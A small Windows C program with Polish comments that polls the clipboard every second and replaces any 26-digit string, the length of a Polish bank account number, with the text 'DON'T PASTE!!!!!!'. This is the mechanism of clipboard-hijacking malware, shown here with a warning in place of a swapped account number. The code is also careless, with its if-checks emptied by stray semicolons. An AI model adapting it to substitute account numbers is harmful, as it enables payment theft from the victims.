#include <windows.h>
#include <stdio.h>
#include <string.h>

int main()
{
    while(1) {

        if (!OpenClipboard(NULL));

        HANDLE hData = GetClipboardData(CF_TEXT);

        char *intercept_text = (char *) GlobalLock(hData); //zcastowanie locka na char pointer
        printf("Original clipboard data: %s\n", intercept_text);

        if (strlen(intercept_text) == 26 && strspn(intercept_text, "0123456789") == 26) {
            printf("detected");

            const char *newClipboardData = "DON'T PASTE!!!!!!";
            size_t len = strlen(newClipboardData) + 1;
            HANDLE hNewData = GlobalAlloc(GMEM_MOVEABLE, len);
            char *new_string_pointer = (char *) GlobalLock(hNewData); //zcastowanie locka na char pointer
            strcpy(new_string_pointer, newClipboardData);//skopiowanie nowego tekstu do globalnego locka

            EmptyClipboard();

            if (SetClipboardData(CF_TEXT, hNewData) == NULL);
            GlobalUnlock(hNewData);
        } else {
            printf("not detected");
        }

        GlobalUnlock(hData);
        CloseClipboard();
        Sleep(1000);
    }
}
